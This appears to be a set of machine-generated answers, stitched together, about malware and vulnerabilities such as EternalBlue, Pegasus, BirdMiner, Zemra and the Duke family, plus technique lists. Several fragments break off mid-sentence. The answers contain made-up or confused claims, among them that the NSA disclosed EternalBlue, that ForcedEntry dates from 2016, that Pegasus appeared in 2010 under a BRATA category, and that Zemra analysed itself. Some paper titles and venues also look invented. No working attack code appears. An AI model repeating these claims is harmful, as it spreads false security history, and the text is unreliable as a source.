CVE-2017-0144, was a remote code execution vulnerability in the Microsoft Server Message Block (SMB) protocol. This meant that an attacker could execute arbitrary code with \"system\" privileges on a vulnerable system, giving them complete control over the computer.\n\nThe Microsoft Security Response Center (MSRC) issued an advisory warning that this vulnerability was also wormable, meaning it could self-replicate and spread from one computer to another on a network without any user interaction. This behavior was seen in attacks including Wannacry and EsteemAudit.\n\nThe seriousness of this vulnerability and its potential impact to the public led Microsoft to take the rare step of releasing a patch for the no longer supported Windows XP operating system.\n\n\nPolymorphic malware refers to a type of malicious software that can change its code or behavior to evade detection by security systems. In the context of the papers you have provided, the authors, Pasupulati, Coit, Levitt, and Wu, have developed a system called Buttercup for detecting polymorphic buffer overflow vulnerabilities in networks.\n\nBuffer overflow vulnerabilities occur when a program attempts to write more data to a buffer than it can hold, resulting in the overwriting of adjacent memory. Polymorphic buffer overflow attacks use this vulnerability to inject malicious code into a system, but they can change the code each time they are executed to avoid detection.\n\nThe Buttercup system is designed to detect polymorphic buffer overflow attacks by analyzing network traffic for suspicious patterns.

Malware authors create BirdMiner malware and distribute it in various ways to infect unsuspecting users. One common method is by disguising it as pirated or cracked applications.\n\nIn this context, BirdMiner is a malicious software package that poses as a desirable application or utility, often a popular one, to lure users into downloading and installing it. The malware is bundled with the pirated or cracked application, making it seem like an essential component for the software to function properly.\n\nWhen users install the pirated or cracked application, they inadvertently install BirdMiner as well. This method is effective because many users, especially those who use macOS, may believe that the App Store is the only source for legitimate software. Installing software from other sources, such as the internet or external drives, can be perceived as risky but may be necessary for obtaining certain applications, especially if they are not available on the App Store or if they are expensive.\n\nMalware authors use this tactic to exploit users' trust and convince them to infect themselves. By bundling BirdMiner with seemingly harmless pirated or cracked applications, the malware authors can bypass users' defenses and gain unauthorized access to their systems. Once installed, BirdMiner can perform various malicious activities, such as ste\n\n\n Jayasinghe is a researcher or a team of researchers, specifically identified as K. Jayasinghe and G.

It is a Microsoft Windows SMB (Server Message Block) exploit that takes advantage of a vulnerability in the SMB protocol, specifically CVE-2017-0144. This vulnerability was first discovered and disclosed by the National Security Agency (NSA) in 2016, but it was later leaked by the Shadow Brokers in April 2017.\n\nThe SMB protocol is a common network file sharing protocol used in Microsoft Windows environments. EternalBlue exploits a vulnerability in the way that the SMB protocol handles certain types of requests, allowing an attacker to execute arbitrary code on a vulnerable system. Once an attacker has successfully exploited this vulnerability, they can gain remote access to the target system and potentially move laterally within a network.\n\nIn the context of the reports you have provided, it appears that two individuals or groups used the EternalBlue exploit to gain control of a system named host2. The reports do not provide any additional information about the nature of the attack or the motivations behind it. However, it is worth noting that EternalBlue was used extensively in the WannaCry ransomware attack in May 2017, which affected hundreds of thousands of systems worldwide and caused significant damage.\n\nThe information you have provided also mentions that the University of Pisa was the authorized licensee of the report and that it was downloaded on December 6, 2023.

In this case, three samples were obtained: WannaCry, Stuxnet, and Resource Editor.\n\nOnce the malware samples have been obtained, the next step is to perform a static analysis of the malware. Static analysis involves examining the malware's code without executing it in a live environment. This can provide valuable insights into the malware's functionality, structure, and behavior.\n\nThe third step is to perform a dynamic analysis of the malware. Dynamic analysis involves executing the malware in a controlled environment, such as a sandbox, to observe its behavior in real-time. This can provide a more comprehensive understanding of the malware's capabilities and how it interacts with the system.\n\nThe fourth step is to perform a reverse engineering of the malware. Reverse engineering involves disassembling the malware's code and understanding how it functions at a low level. This can provide insights into the malware's encryption algorithms, network communication protocols, and other advanced techniques used\n\n\n Skidware is a term used to describe malware or software that is created and distributed by individuals who engage in hacking activities, often referred to as \"skidkids\" or \"skidions.\" The term \"Skidware\" itself is not a specific malware or software, but rather a label used to describe the malicious creations of these individuals.\n\nThe context of the given blog post suggests that Skidware in this case refers to a specific malware family or campaign, possibly named \"Zemra,\" which has been identified and analyzed by various security researchers and organizations, including Symantec and Zemra.\n\nThe Zemra malware is known to be a multi-purpose threat that can function as a backdoor, botnet controller, DDoS (Distributed Denial of Service) tool, exploit, and web application vulnerability exploiter. It is written in multiple programming languages, including C# and PHP, and is capable of infecting Windows systems.\n\nThe blog post also mentions that the Zemra malware is of German origin and is tagged with various keywords related to hacking and security threats, such as botnet, Denial of Service, Exploit, Hack, Idiots, malware, PHP, Security, Skidware, Web Apps, backdoor, trojan, virus, and Zemra.\n\nThe blog post also mentions the existence of \"rippers,\" which are tools used by hackers to extract and modify\n\n\n M. Lindorfer is a researcher or a group of researchers, specifically identified as one of the authors in two different academic papers. In the first paper published in the ACM/IEEE Symposium on Architectures for Networking and Communications Systems (ANCS) in May 2017, titled \"Remote Access Trojans through External Control at Area Network Bor-ders,\" M. Lindorfer is listed among the authors. The paper discusses the discovery and analysis of a type of Remote Access Trojan (RAT) that uses external control at area network borders. The authors describe the characteristics, behavior, and detection of this RAT, as well as proposing countermeasures.\n\nIn the second paper published in the ACM SIGSAC Conference on Computer and Communications Security in January 2018, titled \"Minesweeper: An in-depth look into drive-by cryptocurrency mining and its defense,\" M. Lindorfer is again listed as an author. In this paper, the authors investigate drive-by cryptocurrency mining, which is a type of malware that covertly mines cryptocurrencies by exploiting web browsers. The authors present an in-depth analysis of the Minesweeper malware, which is a popular example of drive-by cryptocurrency mining, and propose countermeasures to prevent and mitigate the impact of such malware.\n\nTherefore, M.

The primary focus of APIMiner is to detect malware and anomalous behavior in applications at the API level, using machine learning techniques.\n\nThe project involves the analysis of bytecode of both positive (malware) and negative (legitimate) samples. The positive samples are obtained from various sources, including international detection agencies, while the negative samples are derived from legitimate applications.\n\nAPIMiner employs privacy-preserving techniques in its analysis to ensure that sensitive information is not leaked during the analysis process. The project aims to reduce the number of false positives and false negatives in the large set of communication samples, which is a common challenge in malware detection.\n\nOne of the main challenges in API-level malware detection is the high rate of false positives and false negatives in the Android environment. APIMiner addresses this challenge by using robust network analysis techniques to analyze the malware samples.\n\nThe project's main demerits include the high rate of false positives and false negatives in the detection of malware samples in the Android environment. Specifically, the samples from Sydney, Australia, have a high rate of false positives and false negatives. This is a significant challenge in the field of API-level malware detection and is an area of ongoing research for the APIMiner project.\n\n\n\n\n\nLucifer is a crypto miner and DDoS hybrid malware that leverages well-known exploits to spread laterally on Windows platforms.[1] Techniques used by Lucifer: Windows Management Instrumentation, Virtualization/Sandbox Evasion:System Checks, System Owner/User Discovery, System Network Connections Discovery, System Network Configuration Discovery, System Information Discovery, Scheduled Task/Job:Scheduled Task, Resource Hijacking, Remote Services:SMB/Windows Admin Shares, Query Registry, Process Discovery, Obfuscated Files or Information:Software Packing, Network Service Discovery, Network Denial of Service, Lateral Tool Transfer, Ingress Tool Transfer, Indicator Removal:Clear Windows Event Logs, Exploitation of Remote Services, Encrypted Channel:Symmetric Cryptography, Deobfuscate/Decode Files or Information, Command and Scripting Interpreter:Windows Command Shell, Brute Force:Password Guessing, Boot or Logon Autostart Execution:Registry Run Keys / Startup Folder, Application Layer Protocol\nMiner-C is malware that mines victims for the Monero cryptocurrency.

Here are some of the key differences between them:\n\n1. **Functionality**: Both MiniDuke and CosmicDuke are downloaders and backdoors, but they serve slightly different purposes. MiniDuke is primarily designed for system information discovery, file and directory discovery, and data exfiltration through fallback channels such as domain generation algorithms. On the other hand, CosmicDuke focuses more on stealing credentials stored in password managers, creating or modifying system processes, clipboard data theft, and automated data exfiltration.\n\n2. **Techniques Used**: While there is overlap in terms of web protocol usage, each piece of malware uses unique techniques. For instance, MiniDuke employs Dead Drop Resolver, Internal Proxy, File and Directory Discovery, Domain Generation Algorithms, and Web Protocols. Meanwhile, CosmicDuke utilizes Credential Stealing, Windows Services modification, Clipboard Data access, and Web Protocols.\n\n3. **Payload Delivery**: Although both can be delivered using various methods, one notable difference is how PolyglotDuke specifically delivers payloads. According to the given context, PolyglotDuke acts as a downloader responsible for dropping MiniDuke onto targeted systems. This shows that while MiniDuke may sometimes act independently, it could also receive further instructions from another component like PolyglotDuke.\n\nIn summary, although MiniDuke and CosmicDuke share similarities being part of the arsenal of APT29, their primary functionalities differ based on the specific tactics they use during operations.", "context": "Infos:\n('', 1.6180837154388428)\n\n\n\n\nMiniDuke is malware that was used by APT29 from 2010 to 2015.

\"ForcedEntry,\" is a sophisticated and highly capable surveillance toolkit that was designed to target and compromise Apple iOS devices. The toolkit gained notoriety in the summer of 2016 when Citizen Lab, a research group based at the University of Toronto's Munk School of Global Affairs and Public Policy, and Lookout, a mobile security firm, discovered and publicly disclosed its existence.\n\nThe toolkit was found to be using three different zero-day vulnerabilities to compromise fully patched iOS devices. Zero-day vulnerabilities refer to security flaws that are unknown to the device manufacturer or the public, and for which no patches or fixes are available. The use of multiple zero-day vulnerabilities made PEGASUS particularly dangerous and difficult to detect.\n\nPEGASUS was capable of performing various surveillance activities on the compromised devices, including:\n\n1. Exfiltrating data: The toolkit could steal sensitive information from the device, such as contacts, emails, call logs, and messages.\n2. Recording calls: PEGASUS could record phone calls without the user's knowledge.\n3. Activating the microphone and camera: The toolkit could activate the device's microphone and camera to spy on the user's surroundings.\n4. Installing additional malware: PEGASUS could install additional malware on the device to expand its capabilities.\n\nThe discovery of PEGASUS was significant because it was the first time that an iOS surveillance toolkit was found to be using multiple zero-day vulnerabilities. This made it a major threat to iOS users, particularly those in high-\n\n\n Pegasus is a type of malware or malicious software that is known for its ability to infiltrate mobile devices, particularly Apple iOS devices. It was first discovered in 2010 and has since been a topic of interest for cybersecurity researchers due to its advanced capabilities.\n\nIn the context of the provided Signature Count data, Pegasus is represented by the third entry under the BRATA category, which has a count of 31. This suggests that there are 31 unique variants or instances of Pegasus malware detected by the antivirus software or threat intelligence database used to generate this data.\n\nPegasus malware is known for its stealthy and sophisticated nature. It can be delivered through various means, including phishing emails, malicious websites, or exploited vulnerabilities in software. Once installed, Pegasus can gain deep access to the infected\n\n\n PEGASUS iOS Kernel is a type of malware that exploits a specific vulnerability in the iOS kernel, which is the low-level core part of the Apple operating system. The PEGASUS iOS Kernel vulnerability, identified as CVE-2016-4656, was discovered and analyzed by SektionEins, a well-known security research firm.\n\nThe PEGASUS iOS Kernel malware is particularly noteworthy because it is capable of bypassing the Apple's sandboxing mechanism, which is designed to prevent malicious code from accessing sensitive data or making unauthorized modifications to the system. This makes it a significant threat to iOS users, as it can potentially gain full control over an infected device.\n\nThe vulnerability itself is a memory corruption issue in the iOS kernel's IOMobileFrameBuffer (IOMFB) driver. This driver is responsible for managing the graphics display on iOS devices. The vulnerability can be triggered when the driver processes a maliciously crafted IOMFB command, leading to arbitrary code execution in kernel mode.\n\nSektionEins' analysis of the iOS security patches revealed that the vulnerability was introduced in iOS 9.3.3 and persisted until iOS 9.3.5. The research firm also discovered that the PEGASUS malware exploited this vulnerability to install a root certificate, allowing it to intercept and decrypt encrypted traffic, effectively rendering the device's encryption features useless.\n\nThe PEGASUS\n\n\n PEGASUS iOS refers to a sophisticated and highly capable mobile malware that exploits a specific kernel vulnerability in Apple's iOS operating system. The malware, which was discovered by the security research firm SektionEins, exploits the CVE-2016-4656 vulnerability in the iOS kernel to gain deep and persistent access to infected devices.\n\nSektionEins is a well-known German security research and consulting firm that specializes in mobile security. The company's website ([www.sektion-eins.de](http://www.sektion-eins.de)) includes sections on \"About SektionEins,\" which provides information about the company's mission, team, and services; \"Services,\" which outlines the various security services offered by the firm; \"News,\" which provides updates on the latest security research and discoveries; and \"Contact,\" which allows visitors to get in touch with the company.\n\nIn the context of the provided information, the article \"PEGASUS iOS Kernel Vulnerability Explained\" by Stefan Esser, which was published on September 2, 2016, is a blog post that provides an in-depth analysis of the CVE-2016-4656 vulnerability and how it was exploited by the PEGASUS iOS malware. The post explains that the vulnerability is a use-after-free issue in the iOS kernel's IOMobileDeviceFamily tree, which can be triggered by a specially crafted\n\n\n Pegasus is a highly sophisticated spyware developed by the NSO Group, an Israel-based cyber surveillance technology company. The NSO Group specializes in creating and selling \"lawful intercept\" spyware to government agencies and intelligence services around the world. The term \"lawful intercept\" refers to the legal practice of intercepting communications under specific legal authorizations.\n\nThe Pegasus spyware is designed to infiltrate mobile devices, primarily iPhones and Android phones, by exploiting vulnerabilities in their operating systems. Once the spyware gains access to a target device, it can perform various actions, such as:\n\n1. Extracting sensitive data: Pegasus can access and exfiltrate data from the target device, including messages, call logs, contacts, emails, and location data.\n2. Recording conversations: The spyware can record phone calls and ambient sounds, allowing the attacker to listen in on conversations.\n3. Activating the microphone and camera: Pegasus can remotely activate the device's microphone and camera, enabling the attacker to spy on the target in real-time.\n4. Intercepting messages: The spyware can intercept messages before they are encrypted, allowing the attacker to read encrypted communications.\n5. Persistence: Pegasus is designed to remain hidden on the device, making it difficult for the target to detect its presence.\n\nThe researchers' discovery of the links to the NSO Group's exploit infrastructure confirms that the Pegasus spyware was being used in targeted attacks. The fact that NSO Group is reportedly owned by an American venture capital firm, Francisco Partners Management, highlights the complex relationship between cybersecurity, technology, and geopolitics.\n\nIt is essential to note that the use of such\n\n\n NSO Group is an Israeli cyber intelligence technology company specializing in the development, sale, and deployment of mobile and web-based solutions for intelligence and law enforcement agencies worldwide. The company's flagship product is the Pegasus Solution, a sophisticated and highly intrusive spyware platform designed to infiltrate and monitor mobile devices, including smartphones and tablets.\n\nThe Pegasus Solution is a targeted surveillance system that exploits vulnerabilities in mobile operating systems, such as iOS and Android, to gain unauthorized access to the targeted device. Once the exploit is successful, the Pegasus spyware is installed, turning the device into a digital spy.\n\nIn the context of the provided information, Mansoor's iPhone was targeted by the Trident exploit chain, which is a method used by the Pegasus Solution to deliver the spyware. The implant, which is the term used for the spyware once it has been installed, transformed Mansoor's iPhone into a digital spy.\n\nThe Pegasus spyware solution was capable of employing Mansoor's iPhone's camera and microphone to eavesdrop on activity in the vicinity of the device. This means that the Pegasus Solution could use the iPhone's camera to take photos and videos without the user's knowledge, and the microphone to record conversations and ambient sounds.\n\nFurthermore, the Pegasus Solution was able to record Mansoor's WhatsApp and Viber calls, which are popular messaging and voice call applications. This means that the Pegasus Solution could intercept and record all voice calls made through these apps,\n\n\n\n\n\nPegasus for Android is the Android version of malware that has reportedly been linked to the NSO Group. [1] [2] The iOS version is tracked separately under Pegasus for iOS.\nPegasus for iOS is the iOS version of malware that has reportedly been linked to the NSO Group. It has been advertised and sold to target high-value victims. [1] [2] The Android version is tracked separately under Pegasus for Android. Techniques used by Pegasus for iOS: Protected User Data:Call Log, Out of Band Data, Location Tracking, Exploitation for Privilege Escalation, Exploitation for Client Execution, Drive-By Compromise, Compromise Client Software Binary, Audio Capture\nXLoader for iOS is a malicious iOS application that is capable of gathering system information.[1] It is tracked separately from the XLoader for Android. Techniques used by XLoader for iOS: System Network Configuration Discovery, System Information Discovery, Subvert Trust Controls:Code Signing Policy Modification, Exfiltration Over C2 Channel"}
